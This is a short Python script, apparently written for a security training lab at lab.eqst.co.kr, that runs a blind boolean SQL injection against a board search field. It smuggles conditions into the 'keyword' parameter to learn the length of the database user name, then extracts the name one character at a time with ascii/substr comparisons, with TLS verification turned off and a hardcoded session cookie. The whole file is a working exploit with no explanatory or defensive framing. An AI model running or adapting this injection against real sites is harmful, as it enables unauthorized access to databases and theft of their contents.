import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://lab.eqst.co.kr:8442/community6/free"
cookies = {"JSESSIONID": "7EEB417D31319AA6EC25D67BEBC3811F"}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "eagle"
}

keyword = "eagle%' and {} and 't%'='t"
length = 0
for i in range(1, 100):
    attackQ = f'length(user) = {i}'
    data["keyword"] = keyword.format(attackQ)

    res = requests.post(url, data=data, headers=headers, cookies=cookies, verify=False)
    if 'tiger' in res.text:
        print(f"유저명 글자수 : {i}")
        length = i
        break

for i in range(1, length+1):
    for asc in range(33, 127):
        query = f"ascii(substr(user,{i},1)) = {asc}"
        data["keyword"] = keyword.format(query)
        res = requests.post(url, data=data, headers=headers, cookies=cookies, verify=False)
        if 'tiger' in res.text:
            print(f"유저명 {i}번째 글자 :{chr(asc)} ")
            
            break